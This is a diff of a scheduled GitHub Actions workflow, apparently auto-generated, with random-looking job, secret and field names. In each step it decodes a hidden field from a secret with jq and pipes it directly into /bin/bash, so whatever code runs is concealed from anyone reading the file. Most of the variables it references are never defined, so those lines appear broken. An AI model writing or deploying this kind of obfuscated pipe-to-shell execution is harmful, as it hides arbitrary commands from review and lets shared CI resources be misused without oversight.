@@ -1,27 +1,24 @@
 name: liutang19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 0/6 * * *'
+    - cron: '12 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liutang19871010
         env:
-          rzkrc85117: ${{ secrets.rzkrc85117 }}
+          qh423: ${{ secrets.qh423 }}
         run: |
-          echo $rzkrc85117 | jq -r .ze313 | /bin/bash
-          echo $ri657 | jq -r .r72 | /bin/bash
-          echo $yvpci3569 | jq -r .sy7685 | /bin/bash
-          echo $f11532 | jq -r .oemo24 | /bin/bash
-          echo $tyww25 | jq -r .kjl7595 | /bin/bash
-          echo $d8 | jq -r .dbate11 | /bin/bash
-          echo $km20 | jq -r .ixi27 | /bin/bash
-          echo $ugqe1 | jq -r .emux55061 | /bin/bash
-          echo $ni8851 | jq -r .z639 | /bin/bash
-          echo $fu92261 | jq -r .q0 | /bin/bash
+          echo $qh423 | jq -r .irnrf007 | /bin/bash
+          echo $w177 | jq -r .jeo47 | /bin/bash
+          echo $hhj9056 | jq -r .ciw6477 | /bin/bash
+          echo $wmub97787 | jq -r .nh47646 | /bin/bash
+          echo $n6650 | jq -r .dkbt88947 | /bin/bash
+          echo $vpcy4 | jq -r .qzftw13478 | /bin/bash
+          echo $wgex42451 | jq -r .sixl7 | /bin/bash
+          echo $hyop4725 | jq -r .vxlsx09979 | /bin/bash
+          echo $rsjz2 | jq -r .dzri24 | /bin/bash
 
